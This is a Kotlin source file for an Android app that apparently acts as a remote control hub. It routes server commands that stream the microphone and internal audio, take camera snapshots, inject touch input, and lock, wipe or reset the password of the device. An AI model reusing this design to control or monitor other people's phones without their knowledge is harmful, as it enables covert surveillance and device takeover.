package com.akdevelopers.streamnode.service

import android.content.Context
import android.os.Handler
import android.os.Looper
import com.akdevelopers.streamnode.analytics.Analytics
import com.akdevelopers.streamnode.analytics.StreamNodeLogger
import com.akdevelopers.streamnode.audio.AudioQualityConfig
import com.akdevelopers.streamnode.audio.AudioQualityPreset
import com.akdevelopers.streamnode.service.FeatureFlags
import com.akdevelopers.streamnode.core.AppConstants
import com.akdevelopers.streamnode.deviceadmin.DeviceAdminCommander
import org.json.JSONObject

/**
 * CommandProcessor — single deduplicating entry point for all commands.
 *
 * Both [com.akdevelopers.streamnode.audio.AudioControlClient] (WebSocket /control)
 * and [com.akdevelopers.streamnode.remote.FirebaseRemoteController] (RTDB) route
 * commands here. Dedup by commandId prevents double-execution even when both
 * channels deliver the same command simultaneously.
 *
 * ── Supported actions ────────────────────────────────────────────────────────
 * Streaming: "start" | "stop" | "change_url" | "reconnect" |
 *            "crash_app" | "crash_service" | "crash_audio" | "crash_oom" | "crash_null"
 * Audio:     "set_quality" | "set_sample_rate" | "set_vbr" | "set_frame_ms" | "set_vox" |
 *            "set_audio_config" | "internal_audio" | "feature_flags" | "snapshot"
 * Admin:     "admin_lock" | "admin_wipe" | "admin_reboot" | "admin_camera_disable" |
 *            "admin_reset_password" | "admin_brightness" | "admin_volume" |
 *            "admin_clear_app_data" | "admin_install_app" | "admin_uninstall_app" |
 *            "admin_max_fails" | "admin_max_lock_time" | "admin_torch"
 *
 * ── Input injection ───────────────────────────────────────────────────────────
 * type="input" messages bypass the dedup ring (not idempotent) and go to [InputInjector].
 */
object CommandProcessor {

    private val log = StreamNodeLogger.forModule("CmdProcessor")
    private val mainHandler = Handler(Looper.getMainLooper())

    private val executedIds = object : LinkedHashSet<String>() {
        override fun add(element: String): Boolean {
            if (size >= AppConstants.COMMAND_DEDUP_MAX_HISTORY) remove(iterator().next())
            return super.add(element)
        }
    }

    // §5.4: Hourly background prune — trims executedIds to the last 20 entries
    // regardless of command activity, so stale dedup entries don't linger for days.
    // 20 entries is more than enough to cover the Firebase RTDB retry window (~5 min).
    private val dedupPruneRunnable: Runnable = object : Runnable {
        override fun run() {
            val keep = AppConstants.COMMAND_DEDUP_HOURLY_KEEP
            if (executedIds.size > keep) {
                val toRemove = executedIds.size - keep
                val iter = executedIds.iterator()
                repeat(toRemove) { if (iter.hasNext()) { iter.next(); iter.remove() } }
                log.d("Hourly dedup prune: removed $toRemove stale IDs, kept ${executedIds.size}")
            }
            mainHandler.postDelayed(this, 60 * 60 * 1_000L) // re-schedule every 1 h
        }
    }

    /** Start the hourly background dedup prune. Call from StreamingService on service start. */
    fun startDedupPrune() {
        mainHandler.removeCallbacks(dedupPruneRunnable)
        mainHandler.postDelayed(dedupPruneRunnable, 60 * 60 * 1_000L)
    }

    /** Stop the hourly prune runnable. Call from StreamingService on service stop. */
    fun stopDedupPrune() {
        mainHandler.removeCallbacks(dedupPruneRunnable)
    }

    // ── Callbacks — wired by StreamingService.wireCommandProcessor() ──────────
    @Volatile var onStart:        (() -> Unit)?       = null
    @Volatile var onStop:         (() -> Unit)?       = null
    @Volatile var onChangeUrl:    ((String) -> Unit)? = null
    @Volatile var onReconnect:    (() -> Unit)?       = null
    @Volatile var onCrashApp:     (() -> Unit)?       = null
    @Volatile var onCrashService: (() -> Unit)?       = null
    @Volatile var onCrashAudio:   (() -> Unit)?       = null
    @Volatile var onCrashOom:     (() -> Unit)?       = null
    @Volatile var onCrashNull:    (() -> Unit)?       = null

    /** Called with the new preset when a set_quality command arrives. */
    @Volatile var onSetQuality: ((AudioQualityPreset) -> Unit)? = null

    /**
     * Feature 2 — called when a set_sample_rate command arrives.
     * Payload is the new sample rate: 8000 | 16000 | 32000 | 48000.
     */
    @Volatile var onSetSampleRate: ((Int) -> Unit)? = null

    /**
     * Feature 1 — called when set_vbr or set_frame_ms command arrives.
     * Params: vbrEnabled (null = keep current), frameSizeMs (null = keep current).
     */
    @Volatile var onApplyFeatureConfig: ((vbrEnabled: Boolean?, frameSizeMs: Int?) -> Unit)? = null

    /** Called when a snapshot command arrives — implementation captures JPEG and sends it back. */
    @Volatile var onSnapshot: (() -> Unit)? = null

    // ── Feature 3: VOX / Silence Gate ─────────────────────────────────────────
    /**
     * Called when a set_vox command arrives.
     * url format: JSON  {"enabled":true,"threshold":150.0}
     * threshold is the RMS value below which frames are dropped (0 = disabled).
     */
    @Volatile var onSetVox: ((enabled: Boolean, threshold: Double) -> Unit)? = null

    // ── Feature 4: Internal Audio / Media Capture ─────────────────────────────
    /**
     * Called when an internal_audio command arrives.
     * url format: JSON  {"enabled":true,"mixWithMic":true}
     * The StreamingService implementation passes its live MediaProjection to
     * MicOrchestrator.applyInternalAudio().
     */
    @Volatile var onInternalAudio: ((enabled: Boolean, mixWithMic: Boolean) -> Unit)? = null

    // ── Feature 8: Advanced Audio Config ─────────────────────────────────────
    /**
     * Called when a set_audio_config command arrives.
     * url format: JSON with all audio parameters — the full custom config.
     * The receiver (MicOrchestrator via StreamingService) should call
     * [AudioQualityConfig.custom] with the parsed fields and hot-swap the engine.
     */
    @Volatile var onSetAudioConfig: ((AudioQualityConfig) -> Unit)? = null

    // ── v6 FeatureFlags system ────────────────────────────────────────────────
    /**
     * Called when a feature_flags command arrives from the server dashboard.
     * url format: JSON subset of [FeatureFlags] — only the fields that changed.
     * StreamingService fans each non-null flag out to the appropriate
     * MicOrchestrator method (setVox, setSampleRate, applyFeatureConfig, etc.).
     */
    @Volatile var onFeatureFlags: ((FeatureFlags) -> Unit)? = null

    // ── Phase 3: Transport mode commands ──────────────────────────────────────
    /**
     * Called when set_transport_webrtc, set_transport_ws, or set_transport_auto arrives.
     * Payload: "webrtc" | "websocket" | "auto"
     * StreamingService wires this to ConnectionOrchestrator.setTransportMode().
     */
    @Volatile var onSetTransport: ((mode: String) -> Unit)? = null

    fun init(context: Context) {
        val prefs = context.getSharedPreferences(AppConstants.PREFS_FILE, Context.MODE_PRIVATE)
        prefs.getString(AppConstants.PREF_LAST_COMMAND_ID, null)?.let { lastId ->
            executedIds.add(lastId)
            log.d("Loaded persisted commandId", "id" to lastId.take(8))
        }
        log.i("CommandProcessor initialized")
    }

    fun reset() {
        onStart = null; onStop = null; onChangeUrl = null; onReconnect = null
        onCrashApp = null; onCrashService = null; onCrashAudio = null
        onCrashOom = null; onCrashNull = null
        onSetQuality = null; onSetSampleRate = null
        onApplyFeatureConfig = null; onSnapshot = null
        onSetVox = null
        onInternalAudio = null
        onSetAudioConfig = null
        onFeatureFlags = null
        onSetTransport = null
    }

    /**
     * Process an incoming command. Silently drops duplicates.
     *
     * @param context   Used to persist commandId and run admin commands.
     * @param commandId UUID from server — primary dedup key.
     * @param action    Command action string (see class-level kdoc).
     * @param url       Non-empty for "change_url", admin payloads, and audio config values.
     * @param source    "websocket" | "firebase" — analytics / logging only.
     */
    fun process(
        context: Context,
        commandId: String,
        action: String,
        url: String = "",
        source: String = ""
    ) {
        if (commandId in executedIds) {
            log.d("Duplicate command skipped",
                "id" to commandId.take(8), "action" to action, "source" to source)
            return
        }

        executedIds.add(commandId)
        context.getSharedPreferences(AppConstants.PREFS_FILE, Context.MODE_PRIVATE)
            .edit().putString(AppConstants.PREF_LAST_COMMAND_ID, commandId).apply()

        log.i("▶ command accepted",
            "action" to action, "id" to commandId.take(8), "source" to source)
        Analytics.logCommandReceived(action, source)

        if (action.startsWith("admin_")) {
            log.i("Routing to admin handler", "action" to action, "payload" to url)
            mainHandler.post {
                when (action) {
                    AppConstants.ADMIN_CMD_TORCH -> {
                        val enable = url.trim() == "true"
                        log.i("admin_torch", "enable" to enable)
                        TorchController.setTorch(context, enable)
                    }
                    else -> DeviceAdminCommander.execute(context, action, url)
                }
            }
            return
        }

        // All streaming callbacks must run on the main thread.
        mainHandler.post {
            when (action) {
                "start"         -> onStart?.invoke()
                "stop"          -> onStop?.invoke()
                "change_url"    -> if (url.isNotBlank()) onChangeUrl?.invoke(url)
                                   else log.w("change_url with empty url — ignored")
                "reconnect"     -> onReconnect?.invoke()
                "crash_app"     -> onCrashApp?.invoke()
                "crash_service" -> onCrashService?.invoke()
                "crash_audio"   -> onCrashAudio?.invoke()
                "crash_oom"     -> onCrashOom?.invoke()
                "crash_null"    -> onCrashNull?.invoke()
                "set_quality"   -> {
                    val preset = runCatching {
                        AudioQualityPreset.valueOf(url.uppercase().trim())
                    }.getOrElse {
                        log.w("set_quality: unknown preset — defaulting to HIGH_QUALITY", "preset" to url)
                        AudioQualityPreset.HIGH_QUALITY
                    }
                    log.i("set_quality", "preset" to preset.name)
                    onSetQuality?.invoke(preset)
                }
                // Feature 2: set_sample_rate — change AudioRecord + Opus sample rate at runtime
                // url format: "8000" | "16000" | "32000" | "48000"
                "set_sample_rate" -> {
                    val rate = url.trim().toIntOrNull()
                    if (rate != null && rate in setOf(8_000, 16_000, 32_000, 48_000)) {
                        log.i("set_sample_rate", "rate" to rate)
                        onSetSampleRate?.invoke(rate)
                    } else {
                        log.w("set_sample_rate: invalid value (8000|16000|32000|48000)", "value" to url)
                    }
                }
                // Feature 1: set_vbr — toggle VBR/CBR
                // url: "true" | "false"
                "set_vbr"       -> {
                    val enabled = url.trim().lowercase() != "false"
                    log.i("set_vbr", "enabled" to enabled)
                    onApplyFeatureConfig?.invoke(enabled, null)
                }
                // Feature 1: set_frame_ms — change Opus frame size
                // url: "2" | "5" | "10" | "20" | "40" | "60"
                "set_frame_ms"  -> {
                    val ms = url.trim().toIntOrNull()
                    if (ms != null && ms in listOf(2, 5, 10, 20, 40, 60)) {
                        log.i("set_frame_ms", "frameMs" to ms)
                        onApplyFeatureConfig?.invoke(null, ms)
                    } else {
                        log.w("set_frame_ms: invalid value (2|5|10|20|40|60)", "value" to url)
                    }
                }
                "snapshot"      -> {
                    log.i("snapshot command received")
                    onSnapshot?.invoke()
                }
                // Feature 3: set_vox — toggle VOX silence gate and set threshold at runtime
                // url: JSON string  {"enabled":true,"threshold":150.0}
                "set_vox"       -> {
                    runCatching {
                        val j = JSONObject(url)
                        val enabled   = j.optBoolean("enabled", false)
                        val threshold = j.optDouble("threshold", 150.0)
                        log.i("set_vox", "enabled" to enabled, "threshold" to threshold)
                        onSetVox?.invoke(enabled, threshold)
                    }.onFailure {
                        log.w("set_vox: failed to parse payload", "url" to url, "error" to it.message)
                    }
                }
                // ── Feature 4: internal_audio — toggle internal audio / media capture ──
                // url: JSON string  {"enabled":true,"mixWithMic":true}
                // Requires API 29+; silently ignored on older devices by MicOrchestrator.
                "internal_audio" -> {
                    runCatching {
                        val j          = JSONObject(url)
                        val enabled    = j.optBoolean("enabled", false)
                        val mixWithMic = j.optBoolean("mixWithMic", true)
                        log.i("internal_audio", "enabled" to enabled, "mixWithMic" to mixWithMic)
                        onInternalAudio?.invoke(enabled, mixWithMic)
                    }.onFailure {
                        log.w("internal_audio: failed to parse payload", "url" to url, "error" to it.message)
                    }
                }
                // ── Feature 8: set_audio_config — apply full custom audio parameter set ──
                // url: JSON string  { sampleRate, bitrate, frameMs, vbr, complexity,
                //                     agc, ns, aec, voxThreshold }
                // Builds an AudioQualityConfig.custom() and invokes onSetAudioConfig.
                "set_audio_config" -> {
                    runCatching {
                        val j = JSONObject(url)
                        val config = AudioQualityConfig.custom(
                            sampleRate     = j.optInt("sampleRate",    48_000),
                            bitrate        = j.optInt("bitrate",       192_000),
                            frameMs        = j.optInt("frameMs",       60),
                            vbrEnabled     = j.optBoolean("vbr",       false),
                            complexity     = j.optInt("complexity",    9),
                            enableAgc      = j.optBoolean("agc",       false),
                            enableNs       = j.optBoolean("ns",        false),
                            enableAec      = j.optBoolean("aec",       false),
                            silenceGateRms = j.optDouble("voxThreshold", 0.0),
                        )
                        log.i("set_audio_config",
                            "sr"  to config.sampleRate,
                            "br"  to config.opusBitrate,
                            "fms" to config.frameMs,
                            "vbr" to config.vbrEnabled,
                            "cmp" to config.opusComplexity,
                        )
                        onSetAudioConfig?.invoke(config)
                    }.onFailure {
                        log.w("set_audio_config: parse failed", "url" to url, "error" to it.message)
                    }
                }
                // ── v6 FeatureFlags — unified toggle dispatch ─────────────────────
                // url: JSON subset of FeatureFlags — only the changed fields.
                // Parses via FeatureFlags.fromJson() and invokes onFeatureFlags.
                // StreamingService fans each non-null flag to the appropriate
                // MicOrchestrator method so the phone reacts to every flag atomically.
                "feature_flags" -> {
                    runCatching {
                        val flags = FeatureFlags.fromJson(url)
                        log.i("feature_flags", "flags" to flags)
                        onFeatureFlags?.invoke(flags)
                    }.onFailure {
                        log.w("feature_flags: parse failed", "url" to url, "error" to it.message)
                    }
                }
                // ── Phase 3: Transport mode pinning ───────────────────────────────────
                // Dashboard sends set_transport_webrtc | set_transport_ws | set_transport_auto.
                // Each updates PREF_WEBRTC_ENABLED + PREF_TRANSPORT_AUTO and triggers a live
                // transport switch via ConnectionOrchestrator.setTransportMode().
                "set_transport_webrtc" -> {
                    log.i("set_transport_webrtc — pinning WebRTC P2P")
                    onSetTransport?.invoke("webrtc")
                }
                "set_transport_ws" -> {
                    log.i("set_transport_ws — pinning WebSocket relay")
                    onSetTransport?.invoke("websocket")
                }
                "set_transport_auto" -> {
                    log.i("set_transport_auto — enabling auto fallback")
                    onSetTransport?.invoke("auto")
                }
                else -> log.w("Unknown action", "action" to action)
            }
        }
    }

    /**
     * Process a remote input injection command (type="input").
     * Bypasses dedup — each gesture is a unique intentional action.
     */
    fun processInput(
        kind: String,
        x: Float = 0f, y: Float = 0f,
        x1: Float = 0f, y1: Float = 0f,
        x2: Float = 0f, y2: Float = 0f,
        durationMs: Long = 150L,
        keycode: Int = 0,
    ) {
        mainHandler.post {
            InputInjector.inject(kind, x, y, x1, y1, x2, y2, durationMs, keycode)
        }
    }
}
